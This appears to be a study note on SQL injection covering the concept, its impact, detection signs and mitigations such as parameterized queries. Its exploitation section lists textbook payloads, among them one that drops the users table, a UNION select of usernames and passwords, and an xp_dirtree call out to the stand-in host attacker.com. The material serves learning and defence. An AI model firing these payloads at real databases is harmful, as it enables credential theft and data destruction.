# SQL Injection  

---

## Metadata  
- **OWASP Category (2021):** A03 Injection  
- **PortSwigger Link:** [What is SQL Injection? Tutorial & Examples | Web Security Academy](https://portswigger.net/web-security/sql-injection)  

- **Sub-Topics:**  
  - UNION attacks = finding columns with useful datatype  
  - Blind SQL = Results are not returned in response  
  - Second-Order (Stored) SQL = App takes user input from an HTTP request, and stores for future use  

---

## 💡 Concept  
- **What is it?**  
> - Allows an attacker to interfere with the queries that an application makes to its database.  
> - Can include data that belongs to other users – or any other data an application can access.  
> - Attackers can execute SQL to compromise the back-end infrastructure and could enable a full takeover.  

**Note:**  Most SQL injections occur within the `WHERE` clause, but can occur anywhere within the query  

- **Impact:**  
> - **Confidentiality:** Extract sensitive database contents (PII, credentials).  
> - **Integrity:** Modify or delete database records.  
> - **Availability:** Drop tables or run heavy queries to crash the database.  

---

## 🛠 Exploitation Notes  
- **Where to test:**  
> - In the entry points of an application that interacts with the database  

- **Payloads / Tricks used:**  
> - Boolean logic:  
>   ```
>   ' OR 1=1--
>   ```  
> - Stacked queries (if supported):  
>   ```
>   '; DROP TABLE users--
>   ```  
> - UNION attack:  
>   ```
>   ' UNION SELECT username, password FROM users--
>   ```  
> - Time-based blind:  
>   ```
>   ' OR IF(1=1, SLEEP(5), 0)--
>   ```  
> - Out-of-band:  
>   ```
>   '; exec xp_dirtree '\\attacker.com\share'--
>   ```  

---

## 🔍 Detection  
- **How to identify in apps:**  
> - A single quote `'` → and view any errors.  
> - SQL-specific syntax that evaluates different values.  
> - Different responses from boolean conditions (OR 1=1, OR 1=2).  
> - Time delays when an SQL query is executed.  

- **Automated detection tools:** Burp Scanner, SQLMap  

---

## 🛡 Mitigation  
- **Developer-side fixes:**  
> - Parameterized queries (prepared statements) for when untrusted input appears as data within the query → string used must be a hard-coded constant  
> - Whitelisting permitted values  
> - Different logic to disallow the behavior  

---

## Extras  
- **Cheat sheet / references:**  
  - [SQL injection cheat sheet | Web Security Academy](https://portswigger.net/web-security/sql-injection/cheat-sheet)  

